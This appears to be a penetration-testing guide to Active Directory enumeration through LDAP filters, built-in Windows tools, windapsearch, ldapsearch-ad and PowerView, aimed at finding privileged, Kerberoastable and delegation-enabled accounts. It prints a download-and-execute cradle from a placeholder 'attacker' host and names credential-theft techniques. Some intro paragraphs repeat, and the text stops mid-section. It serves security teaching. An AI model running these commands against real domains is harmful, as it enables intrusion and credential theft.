1. Active Directory LDAP

Active Directory stores its data in a hierarchical database accessed primarily through the Lightweight Directory Access Protocol (LDAP). Understanding LDAP query mechanics is essential for both enumeration and attack path discovery in AD environments.

1.1 AD Fundamentals

Active Directory Domain Services (AD DS) is Microsoft's directory service for Windows domain networks. It stores information about members of the domain (users, computers, groups, policies) and provides authentication and authorization services. Every object in AD is defined by a set of attributes stored in a schema.

1.1.1 Active Directory Overview

Active Directory Domain Services (AD DS) is Microsoft's directory service for Windows domain networks. It stores information about members of the domain (users, computers, groups, policies) and provides authentication and authorization services. Every object in AD is defined by a set of attributes stored in a schema.

Objects Enumerable by Any Domain User

Any authenticated domain user can query a wide range of AD objects by default. This is by design; AD relies on read access for normal operations such as locating printers, resolving group memberships, and validating service accounts.

Object TypeEnumerable DataRelevance
UserssAMAccountName, memberOf, description, userAccountControl, pwdLastSet, lastLogonTarget identification, password spraying candidates
Groupsname, member, managedBy, groupTypePrivilege mapping, lateral movement paths
ComputersdNSHostName, operatingSystem, servicePrincipalName, msDS-AllowedToDelegateToTarget prioritization, delegation abuse
OUsname, gpLink, descriptionGPO scope, organizational structure
GPOsdisplayName, gPCFileSysPathPolicy auditing, privilege escalation
TruststrustPartner, trustDirection, trustTypeCross-domain and cross-forest attack paths
Common AD Attacks Leveraging Misconfigurations

Many AD attacks exploit default or poorly configured access controls rather than software vulnerabilities. Common categories include:

CategoryTechniques
Credential HarvestingKerberoasting, AS-REP Roasting, LLMNR/NBT-NS poisoning
Privilege EscalationACL abuse, delegation abuse, GPO modification
Lateral MovementPass-the-Hash, Pass-the-Ticket, WMI/WinRM/DCOM execution
PersistenceGolden Ticket, Silver Ticket, DCSync, skeleton key
Trust AbuseExtraSids, SID History injection, cross-forest Kerberoasting
Active Directory Structure

AD is organized in a hierarchical structure:

ComponentDescription
ForestTop-level security boundary. All domains share a common schema, configuration partition, and Global Catalog. Forests trust each other only through explicit trust relationships.
DomainPrimary administrative boundary. Each domain has its own domain controllers, security policies, and namespace (e.g., corp.example.com).
Organizational Unit (OU)Container within a domain for organizing objects and applying Group Policy. OUs do not constitute a security boundary.
SitesPhysical network topology mappings that control replication and service location. Sites span domains.

The three AD partitions replicated across domain controllers are:

PartitionNaming Context (DN)Contents
DomainDC=corp,DC=example,DC=comUsers, computers, groups, OUs, GPOs
ConfigurationCN=Configuration,DC=example,DC=comSites, subnets, ADCS CAs, trusts, replication topology
SchemaCN=Schema,CN=Configuration,DC=example,DC=comObject class and attribute definitions

1.1.2 Rights and Privileges in AD

Windows differentiates between rights (actions a user can perform on the system) and privileges (exemptions from access checks). Both are critical for understanding what an account can do on a host and across the domain.

Privileged AD Groups

Several built-in groups grant significant privileges across the domain:

GroupScopeKey Privileges
Domain AdminsDomain-wideFull admin on all domain-joined machines, added to local Administrators on every host
Enterprise AdminsForest-wideFull admin across all domains in the forest (exists only in root domain)
Schema AdminsForest-wideCan modify the AD schema (root domain only)
Server OperatorsDomain ControllersCan log on to DCs, manage services, backup files
Account OperatorsDomain-wideCan create and manage most users and groups (not Domain Admins)
Backup OperatorsDomain ControllersCan backup and restore files on DCs (can extract NTDS.dit)
DnsAdminsDomain-wideCan configure DNS; abuse via DLL loading on the DNS service leads to SYSTEM on DC
Group Policy Creator OwnersDomain-wideCan create new GPOs in the domain
 
# Enumerate members of high-value groups
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object Name, SamAccountName
Get-ADGroupMember -Identity "Enterprise Admins" -Recursive
Get-ADGroupMember -Identity "Backup Operators"
User Rights Assignment

User Rights Assignment settings in Group Policy control which accounts can perform privileged operations on a host. Key assignments relevant to pentesting:

RightConstantImpact
SeDebugPrivilegeDebug programsRead/write any process memory (extract LSASS credentials)
SeImpersonatePrivilegeImpersonate a clientPotato-style escalation to SYSTEM
SeBackupPrivilegeBack up files and directoriesRead any file regardless of ACL (extract NTDS.dit)
SeRestorePrivilegeRestore files and directoriesWrite any file regardless of ACL
SeTakeOwnershipPrivilegeTake ownership of files/objectsSeize ownership of any securable object
SeLoadDriverPrivilegeLoad and unload device driversKernel-mode code execution via malicious driver
SeAssignPrimaryTokenPrivilegeReplace a process-level tokenToken manipulation for impersonation
 
# Check current user privileges
whoami /priv

# Enumerate user rights on a remote host via GPO
Get-GPResultantSetOfPolicy -Computer DC01 -ReportType HTML -Path C:\gpo_report.html

1.1.3 Microsoft Remote Server Administration Tools (RSAT)

RSAT provides a set of management tools for remotely administering Windows Server roles and features from a workstation. For AD enumeration, RSAT supplies the ActiveDirectory PowerShell module and GUI snap-ins like ADUC and GPMC.

RSAT Tools and Installation

On Windows 10/11, RSAT features are installed as optional capabilities:

# List available RSAT features
Get-WindowsCapability -Name RSAT* -Online | Select-Object Name, State

# Install the AD DS and LDS Tools feature (includes AD PowerShell module)
Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Online

# Install DNS Server Tools
Add-WindowsCapability -Name Rsat.Dns.Tools~~~~0.0.1.0 -Online

# Install Group Policy Management Console
Add-WindowsCapability -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0 -Online

On older Windows Server versions, RSAT is installed via Server Manager (Add Roles and Features Wizard) or PowerShell:

Install-WindowsFeature RSAT-AD-PowerShell, RSAT-AD-Tools, RSAT-DNS-Server
Domain Context for Enumeration

When operating from a domain-joined machine with valid credentials, RSAT tools automatically bind to the user's current domain. For cross-domain enumeration or when running from a non-domain-joined system:

# Specify a domain controller and credentials explicitly
$cred = Get-Credential
Get-ADUser -Filter * -Server dc01.corp.local -Credential $cred

# Set a PSDrive to a different domain
New-PSDrive -Name TARGETAD -PSProvider ActiveDirectory -Server "dc01.target.local" -Credential $cred -Root "//RootDSE/"
cd TARGETAD:
Enumeration with RSAT Snap-ins

RSAT includes several MMC snap-ins for visual enumeration:

  • Active Directory Users and Computers (ADUC): browse users, groups, computers, OUs. Right-click an object for attribute details. Enable Advanced Features for security tab and attribute editor.
  • Active Directory Sites and Services: view AD replication topology, site links, and subnet assignments.
  • Group Policy Management Console (GPMC): browse GPOs linked to OUs, view GPO settings, check GPO permissions.
  • DNS Manager: enumerate DNS zones, records, and identify hosts (forward and reverse lookups).
  • ADSI Edit: low-level access to all AD objects and attributes. Connect to any naming context (Domain, Configuration, Schema).

1.1.4 The Power of NT AUTHORITY\SYSTEM

NT AUTHORITY\SYSTEM is the highest-privilege built-in account on a Windows system. It operates with full control over the local machine and, on domain-joined hosts, authenticates to the domain as the computer account.

SYSTEM Privileges

SYSTEM holds all privileges on the local system, including SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege, and SeTakeOwnershipPrivilege. Common ways to obtain SYSTEM:

  • PsExec: psexec.exe -i -s cmd.exe (requires local admin)
  • Service creation: create a Windows service with the binary pointing to a payload
  • Scheduled task: register a task running as SYSTEM
  • Potato exploits: SeImpersonatePrivilege escalation (JuicyPotato, PrintSpoofer, GodPotato)
# Verify you are running as SYSTEM
whoami
# NT AUTHORITY\SYSTEM

# Check privileges
whoami /priv
SYSTEM and Domain Enumeration

When a computer is joined to a domain, its machine account (e.g., WORKSTATION01$) is a domain principal with its own password (auto-rotated every 30 days). Running as SYSTEM on a domain-joined host means AD queries execute in the context of that machine account. This provides:

  • Authenticated access to LDAP for full AD enumeration
  • The ability to request Kerberos tickets as the machine account
  • Read access to the same AD objects as any domain user
  • SPNs on the machine account that can be used for Silver Ticket forging if the NTLM hash is known
# As SYSTEM on a domain-joined machine, enumerate the domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Enumerate domain users via ADSI as the machine account
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=user)"
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"] }
Note: SYSTEM access on a Domain Controller grants the ability to extract the NTDS.dit database using ntdsutil, Volume Shadow Copy, or tools like secretsdump.py, yielding every domain password hash.

1.2 LDAP Protocol and Search Filters

LDAP (Lightweight Directory Access Protocol) is the primary protocol for querying and modifying AD. It operates on TCP port 389 (cleartext) and port 636 (LDAPS/TLS). Global Catalog queries use ports 3268 and 3269.

1.2.1 LDAP Overview

LDAP (Lightweight Directory Access Protocol) is the primary protocol for querying and modifying AD. It operates on TCP port 389 (cleartext) and port 636 (LDAPS/TLS). Global Catalog queries use ports 3268 and 3269.

LDAP Authentication

LDAP supports several authentication mechanisms:

MethodMechanismNotes
Simple BindDN + password in cleartextMust use LDAPS or channel binding; insecure over plain LDAP
SASL (GSSAPI)Kerberos ticketDefault for domain-joined Windows clients; most secure
SASL (NTLM)NTLM challenge-responseFallback when Kerberos is unavailable
Anonymous BindNo credentialsDisabled by default on Windows Server 2003+; exposes rootDSE at minimum
 
# LDAP simple bind test with ldapsearch
ldapsearch -x -H ldap://dc01.corp.local -D "CN=user,CN=Users,DC=corp,DC=local" -w 'Password123' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# LDAPS connection
ldapsearch -x -H ldaps://dc01.corp.local -D "user@corp.local" -w 'Password123' -b "DC=corp,DC=local"
LDAP Queries

An LDAP query consists of several components:

  • Base DN: the starting point in the directory tree (e.g., DC=corp,DC=local)
  • Scope: how deep to search (Base, OneLevel, Subtree)
  • Filter: the search criteria (e.g., (objectClass=user))
  • Attributes: which attributes to return (e.g., sAMAccountName, memberOf)
# PowerShell ADSI query
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = "LDAP://DC=corp,DC=local"
$searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
$searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
$searcher.PropertiesToLoad.Add("memberof") | Out-Null
$searcher.FindAll()

1.2.2 Active Directory Search Filters (PowerShell)

The Get-ADUser, Get-ADGroup, and Get-ADComputer cmdlets from the ActiveDirectory module accept -Filter and -LDAPFilter parameters. The -Filter parameter uses PowerShell-style syntax while -LDAPFilter takes standard LDAP filter strings.

PowerShell Filter Operators
OperatorDescriptionExample
-eqEqualName -eq "John"
-neNot equalEnabled -ne $false
-likeWildcard matchName -like "svc*"
-notlikeWildcard not matchName -notlike "admin*"
-gt / -ltGreater / less thanBadLogonCount -gt 5
-ge / -leGreater or equal / less or equallogonCount -ge 1
-andLogical AND(Enabled -eq $true) -and (Name -like "svc*")
-orLogical OR(Name -like "*admin*") -or (Name -like "*svc*")
-notLogical NOT-not (Name -like "test*")
Filter Examples
# Find all enabled users
Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Select-Object Name, LastLogonDate

# Find service accounts (SPN set)
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName

# Find users with password never expires
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires

# Find users whose password has not changed in 90 days
$cutoff = (Get-Date).AddDays(-90)
Get-ADUser -Filter {PasswordLastSet -lt $cutoff} -Properties PasswordLastSet | Select-Object Name, PasswordLastSet

# Find disabled computer accounts
Get-ADComputer -Filter {Enabled -eq $false}

# Find all groups containing "admin" in the name
Get-ADGroup -Filter {Name -like "*admin*"}
Escaped Characters in Filters

Certain characters must be escaped in LDAP filter strings using their hex representation:

CharacterEscape Sequence
*\2a
(\28
)\29
\\5c
NUL\00
 
# Searching for a user with parentheses in the CN
Get-ADUser -LDAPFilter "(cn=John \28IT\29)"

1.2.3 LDAP Search Filters

LDAP search filters follow a prefix notation defined in RFC 4515. Every filter is enclosed in parentheses and can combine simple assertions with boolean operators.

LDAP Filter Syntax and Operators

LDAP filters use prefix (Polish) notation. Operators precede their operands:

OperatorSyntaxExample
AND(&(filter1)(filter2))(&(objectClass=user)(enabled=TRUE))
OR(|(filter1)(filter2))(|(sAMAccountName=admin)(sAMAccountName=svc*))
NOT(!(filter))(!(userAccountControl:1.2.840.113556.1.4.803:=2))
Equality(attribute=value)(sAMAccountName=jsmith)
Presence(attribute=*)(servicePrincipalName=*)
Substring(attribute=*value*)(cn=*admin*)
Approx(attribute~=value)(sn~=Smith)
GTE / LTE(attribute>=value)(whenCreated>=20230101000000.0Z)
Search Criteria and Rules

Filters can be nested to arbitrary depth. Complex queries combine AND, OR, and NOT:

# Find enabled users with an SPN set (Kerberoastable)
"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

# Find computers running Windows Server
"(&(objectClass=computer)(operatingSystem=*Server*))"

# Find users in Domain Admins or Enterprise Admins
"(&(objectClass=user)(|(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)(memberOf=CN=Enterprise Admins,CN=Users,DC=corp,DC=local)))"
Filter Types, Item Types, and Escaped Characters

Filters operate on attribute types. AD attributes can be string, integer, boolean, DN, octet string, or generalized time. When filtering on binary attributes (like objectSid or objectGUID), values must be hex-escaped byte by byte:

# Filter by SID (each byte escaped)
"(objectSid=\01\05\00\00\00\00\00\05\15\00\00\00...)"

# Filter by GUID
"(objectGUID=\a1\b2\c3...)"

The same character escaping rules from section 2.6.3 apply. Additionally, when querying from Linux with ldapsearch, special shell characters must be quoted or escaped.

Matching Rule OIDs

AD extends LDAP with extensible matching rules for bitwise and chain (recursive) operations:

OIDNameUse
1.2.840.113556.1.4.803LDAP_MATCHING_RULE_BIT_ANDBitwise AND on integer attributes (e.g., userAccountControl flags)
1.2.840.113556.1.4.804LDAP_MATCHING_RULE_BIT_ORBitwise OR on integer attributes
1.2.840.113556.1.4.1941LDAP_MATCHING_RULE_IN_CHAINRecursive/transitive membership lookup (nested groups)
 
# Find accounts with "Password Not Required" (UAC flag 0x20 = 32)
"(userAccountControl:1.2.840.113556.1.4.803:=32)"

# Find disabled accounts (UAC flag 0x2 = 2)
"(userAccountControl:1.2.840.113556.1.4.803:=2)"

# Find all users who are members (including nested) of Domain Admins
"(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)"
Practical LDAP Filter Examples
# Kerberoastable accounts (enabled user with SPN)
"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

# AS-REP Roastable accounts (DONT_REQUIRE_PREAUTH set)
"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

# Accounts trusted for unconstrained delegation (not DCs)
"(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"

# Users with constrained delegation configured
"(&(objectClass=user)(msDS-AllowedToDelegateTo=*))"

# LAPS-managed computers (ms-Mcs-AdmPwd attribute present)
"(&(objectClass=computer)(ms-Mcs-AdmPwd=*))"

# Users with adminCount=1 (direct or indirect admin)
"(&(objectCategory=person)(objectClass=user)(adminCount=1))"

# Computers with the TRUSTED_FOR_DELEGATION flag
"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"

1.2.4 Recursive Match and Search Scope

AD frequently uses nested group memberships. A user may belong to "IT Staff," which is a member of "IT Admins," which is a member of "Domain Admins." Standard memberOf queries only return direct memberships. Recursive (transitive) matching resolves the full chain.

Recursive Match (Nested Group Membership)

The LDAP_MATCHING_RULE_IN_CHAIN OID (1.2.840.113556.1.4.1941) traverses nested group memberships:

# PowerShell: find all users who are transitively members of Domain Admins
Get-ADUser -LDAPFilter "(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)"

# PowerShell (AD module): recursive flag
Get-ADGroupMember -Identity "Domain Admins" -Recursive
# ldapsearch: transitive membership
ldapsearch -x -H ldap://dc01.corp.local -D "user@corp.local" -w 'Pass' -b "DC=corp,DC=local" \
  "(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=corp,DC=local)" sAMAccountName
SearchBase and SearchScope Parameters

LDAP search scope controls the depth of the query from the base DN:

ScopeBehaviorPowerShell Value
BaseReturns only the base object itself-SearchScope Base
OneLevelReturns immediate children of the base (not the base itself)-SearchScope OneLevel
SubtreeReturns the base and all descendants (default)-SearchScope Subtree
 
# Search only within a specific OU
Get-ADUser -Filter * -SearchBase "OU=ServiceAccounts,DC=corp,DC=local" -SearchScope OneLevel

# Search the entire domain (default subtree)
Get-ADUser -Filter * -SearchBase "DC=corp,DC=local"

# Check attributes of a single object (base scope)
Get-ADObject -Identity "CN=Administrator,CN=Users,DC=corp,DC=local" -SearchScope Base -Properties *

1.3 Enumerating AD with Built-in Tools

Even without third-party tools, Windows provides several built-in methods for AD enumeration. These approaches generate less suspicious telemetry compared to offensive tooling.

1.3.1 User-Account-Control (UAC) Attributes

The userAccountControl attribute is a bitmask storing account flags. Key flags relevant to attacks:

FlagHex ValueDecimalMeaning
ACCOUNTDISABLE0x00022Account is disabled
PASSWD_NOTREQD0x002032No password required
NORMAL_ACCOUNT0x0200512Standard user account
DONT_EXPIRE_PASSWORD0x1000065536Password never expires
DONT_REQ_PREAUTH0x4000004194304Kerberos pre-auth not required (AS-REP Roastable)
TRUSTED_FOR_DELEGATION0x80000524288Unconstrained delegation enabled
TRUSTED_TO_AUTH_FOR_DELEGATION0x100000016777216Constrained delegation with protocol transition (S4U2Self)

1.3.2 DS Tools

The ds* command-line tools are available on any domain-joined Windows machine:

# dsquery: query AD for objects matching criteria
dsquery user -inactive 4       # Users inactive for 4+ weeks
dsquery computer -stalepwd 90  # Computers with stale passwords
dsquery * -filter "(servicePrincipalName=*)" -attr sAMAccountName servicePrincipalName

# dsget: retrieve attributes of a specific object
dsget user "CN=Administrator,CN=Users,DC=corp,DC=local" -memberof -expand

# dsmod: modify AD objects (requires appropriate permissions)
dsmod user "CN=TestUser,CN=Users,DC=corp,DC=local" -pwd NewPass123!

1.3.3 AD PowerShell Module

# Import the module
Import-Module ActiveDirectory

# Basic enumeration
Get-ADDomain                               # Domain info
Get-ADForest                               # Forest info
Get-ADUser -Filter * -Properties *         # All users (caution: heavy query)
Get-ADGroup -Filter * | Measure-Object     # Count all groups
Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object Name, OperatingSystem
Get-ADTrust -Filter *                      # Domain trusts

# Targeted queries
Get-ADUser -Identity administrator -Properties *
Get-ADUser -Filter {AdminCount -eq 1}      # Protected accounts

1.3.4 Windows Management Instrumentation (WMI)

# WMI queries for system information
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber
Get-WmiObject -Class Win32_ComputerSystem | Select-Object Domain, DomainRole

# Remote WMI query
Get-WmiObject -Class Win32_Service -ComputerName DC01 | Where-Object { $_.StartName -like "*admin*" }

# CIM (modern replacement for WMI)
Get-CimInstance -ClassName Win32_UserAccount -ComputerName DC01 | Select-Object Name, Disabled

1.3.5 AD Service Interfaces (ADSI)

ADSI provides low-level access to AD through COM objects. It works without the AD PowerShell module installed:

# Connect to the domain root
$domain = [ADSI]"LDAP://DC=corp,DC=local"
$domain.distinguishedName

# Create a directory searcher
$searcher = New-Object System.DirectoryServices.DirectorySearcher($domain)
$searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","memberof","description"))
$results = $searcher.FindAll()

foreach ($r in $results) {
    $r.Properties["samaccountname"]
}

# Query a specific object
$user = [ADSI]"LDAP://CN=Administrator,CN=Users,DC=corp,DC=local"
$user.memberOf

# Connect with alternate credentials
$entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=corp,DC=local", "corp\user", "Password123")
$searcher = New-Object System.DirectoryServices.DirectorySearcher($entry)
$searcher.Filter = "(objectClass=group)"
$searcher.FindAll()

Methodology

  • Query inactive users and stale computer accounts with dsquery: 
    dsquery user -inactive 4
dsquery computer -stalepwd 90
  • Enumerate accounts with SPNs (Kerberoastable) via dsquery: 
    dsquery * -filter "(servicePrincipalName=*)" -attr sAMAccountName servicePrincipalName
  • Enumerate domain info, users, groups, trusts, and protected accounts with the AD PowerShell module: 
    Import-Module ActiveDirectory
Get-ADDomain
Get-ADForest
Get-ADUser -Filter {AdminCount -eq 1}
Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object Name, OperatingSystem
Get-ADTrust -Filter *
  • Query remote systems via WMI/CIM for services running under privileged accounts: 
    Get-WmiObject -Class Win32_Service -ComputerName DC01 | Where-Object { $_.StartName -like "*admin*" }
Get-CimInstance -ClassName Win32_UserAccount -ComputerName DC01 | Select-Object Name, Disabled
  • Use ADSI DirectorySearcher to enumerate users without the AD module installed: 
    $domain = [ADSI]"LDAP://DC=corp,DC=local"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($domain)
$searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","memberof","description"))
$results = $searcher.FindAll()
foreach ($r in $results) { $r.Properties["samaccountname"] }
  • Connect via ADSI with alternate credentials for cross-domain or stealth enumeration: 
    $entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=corp,DC=local", "corp\user", "Password123")
$searcher = New-Object System.DirectoryServices.DirectorySearcher($entry)
$searcher.Filter = "(objectClass=group)"
$searcher.FindAll()

1.4 LDAP Enumeration

LDAP anonymous bind allows unauthenticated queries to the directory. While Windows Server 2003 and later restrict anonymous LDAP by default, misconfigurations or legacy environments may still permit it. An anonymous bind always returns the rootDSE object, which reveals the domain naming context, supported LDAP controls, and domain functional level.

1.4.1 LDAP Anonymous Bind

LDAP anonymous bind allows unauthenticated queries to the directory. While Windows Server 2003 and later restrict anonymous LDAP by default, misconfigurations or legacy environments may still permit it. An anonymous bind always returns the rootDSE object, which reveals the domain naming context, supported LDAP controls, and domain functional level.

Checking for Anonymous Bind
# Quick check: query rootDSE anonymously (always works)
ldapsearch -x -H ldap://dc01.corp.local -s base -b "" "(objectClass=*)" namingContexts defaultNamingContext

# Attempt anonymous enumeration of domain objects
ldapsearch -x -H ldap://dc01.corp.local -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
# If this returns results, anonymous bind is misconfigured
Using ldapsearch for Anonymous Enumeration
# Enumerate naming contexts (always available via rootDSE)
ldapsearch -x -H ldap://10.10.10.10 -s base -b "" namingContexts

# Extract domain functional level
ldapsearch -x -H ldap://10.10.10.10 -s base -b "" domainFunctionality

# If anonymous access is enabled, enumerate users
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(&(objectClass=user)(objectCategory=person))" sAMAccountName description memberOf

# Enumerate all groups
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=group)" cn member
Using windapsearch for Anonymous Enumeration
# windapsearch anonymous enumeration
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -U
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -G
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -C

# Go version
./windapsearch -d corp.local --dc 10.10.10.10 --module users
./windapsearch -d corp.local --dc 10.10.10.10 --module groups
Using ldapsearch-ad.py
# ldapsearch-ad.py anonymous enumeration
python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -t info
python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -t search -s "(objectClass=user)" sAMAccountName

1.4.2 Credentialed LDAP Enumeration

With valid domain credentials, LDAP enumeration provides comprehensive access to AD objects. Credentialed queries return all user-readable attributes, enabling thorough attack surface mapping.

Credentialed windapsearch
# Enumerate all domain users
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -u "user@corp.local" -p "Password123" -U --full

# Enumerate domain admins
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -u "user@corp.local" -p "Password123" --da

# Enumerate computers
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -u "user@corp.local" -p "Password123" -C

# Find Kerberoastable accounts
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -u "user@corp.local" -p "Password123" -U --attrs sAMAccountName,servicePrincipalName --filter "(servicePrincipalName=*)"

# Enumerate unconstrained delegation
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -u "user@corp.local" -p "Password123" --unconstrained-users
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -u "user@corp.local" -p "Password123" --unconstrained-computers
Credentialed ldapsearch-ad.py
# Domain info
python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -u user -p Password123 -t info

# Enumerate users
python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -u user -p Password123 -t search \
  -s "(&(objectCategory=person)(objectClass=user))" sAMAccountName description memberOf

# Enumerate trusts
python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -u user -p Password123 -t trusts

# Dump password policy
python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -u user -p Password123 -t pass-pol

# Kerberoastable accounts
python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -u user -p Password123 -t kerberoast

# AS-REP Roastable accounts
python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -u user -p Password123 -t asreproast

# Full LDAP dump
ldapsearch -x -H ldap://10.10.10.10 -D "user@corp.local" -w 'Password123' -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName userAccountControl memberOf \
  servicePrincipalName pwdLastSet description adminCount

Methodology

  • Probe rootDSE for naming contexts and domain functional level (always works anonymously): 
    ldapsearch -x -H ldap://dc01.corp.local -s base -b "" "(objectClass=*)" namingContexts defaultNamingContext
ldapsearch -x -H ldap://10.10.10.10 -s base -b "" domainFunctionality
  • Test for anonymous bind misconfiguration by querying domain users and groups: 
    ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(&(objectClass=user)(objectCategory=person))" sAMAccountName description memberOf
ldapsearch -x -H ldap://10.10.10.10 -b "DC=corp,DC=local" "(objectClass=group)" cn member
  • Run windapsearch anonymous enumeration for users, groups, and computers: 
    python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -U
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -G
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -C
  • With valid credentials, enumerate domain admins, Kerberoastable accounts, and unconstrained delegation: 
    python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -u "user@corp.local" -p "Password123" --da
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -u "user@corp.local" -p "Password123" -U --attrs sAMAccountName,servicePrincipalName --filter "(servicePrincipalName=*)"
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -u "user@corp.local" -p "Password123" --unconstrained-users
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.10 -u "user@corp.local" -p "Password123" --unconstrained-computers
  • Use ldapsearch-ad.py to dump password policy, Kerberoastable accounts, and AS-REP Roastable accounts: 
    python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -u user -p Password123 -t pass-pol
python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -u user -p Password123 -t kerberoast
python3 ldapsearch-ad.py -l 10.10.10.10 -d corp.local -u user -p Password123 -t asreproast
  • Perform a full credentialed LDAP dump of key user attributes: 
    ldapsearch -x -H ldap://10.10.10.10 -D "user@corp.local" -w 'Password123' -b "DC=corp,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName userAccountControl memberOf \
  servicePrincipalName pwdLastSet description adminCount

2. Active Directory PowerView

PowerView is a PowerShell-based AD reconnaissance tool developed by Will Schroeder (harmj0y) as part of the PowerSploit framework. Its .NET counterpart, SharpView, provides equivalent functionality as a compiled C# assembly. Both tools query AD through LDAP, providing extensive enumeration capabilities beyond what the built-in AD module offers.

2.1 PowerView and SharpView Overview

PowerView loads as a PowerShell script (PowerView.ps1) while SharpView compiles to a .NET executable. Both produce identical LDAP queries under the hood. PowerView remains popular for its flexibility; SharpView is useful when PowerShell is constrained.

# Load PowerView
Import-Module .\PowerView.ps1
# Or via web cradle
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# SharpView (compiled .NET)
.\SharpView.exe Get-DomainUser -Identity administrator

2.1.1 Misc Functions

FunctionDescription
Export-PowerViewCSVAppend results to a CSV file in a thread-safe manner
ConvertTo-SIDConvert a username or group name to its Security Identifier
Convert-ADNameConvert between AD name formats (DN, canonical, NT4, display)
ConvertFrom-UACValueDecode userAccountControl integer into human-readable flags
Get-DomainSPNTicketRequest a Kerberos TGS ticket for a given SPN (Kerberoasting)
Invoke-KerberoastKerberoast all accounts with SPNs in the current domain
Get-PathAclGet the ACL for a specified file path or registry key

Methodology

  • Load PowerView into the current session: 
    Import-Module .\PowerView.ps1
  • Alternatively, load PowerView via a web cradle if the file is hosted remotely: 
    IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
  • If PowerShell is constrained, use the compiled SharpView binary instead: 
    .\SharpView.exe Get-DomainUser -Identity administrator
  • Verify the tool loaded correctly by pulling basic domain information: 
    Get-Domain
Get-DomainController | Select-Object Name, IPAddress, OSVersion
  • Locate machines where the current user has local admin access: 
    Find-LocalAdminAccess -Verbose
  • Hunt for accessible shares and interesting files across domain computers: 
    Find-DomainShare
Find-InterestingDomainShareFile

2.2 User and Group Enumeration

User enumeration identifies high-value targets, dormant accounts, and accounts with exploitable attributes. PowerView provides granular control over user queries.

2.2.1 Enumerating AD Users

User enumeration identifies high-value targets, dormant accounts, and accounts with exploitable attributes. PowerView provides granular control over user queries.

Key AD User Data Points
# All users with all properties
Get-DomainUser | Select-Object samaccountname, description, memberof, pwdlastset, lastlogon, useraccountcontrol

# Find specific user
Get-DomainUser -Identity jsmith -Properties *

# Users with SPN (Kerberoastable)
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Users with admin count set
Get-DomainUser -AdminCount | Select-Object samaccountname, memberof

# Users with non-empty description (may contain passwords)
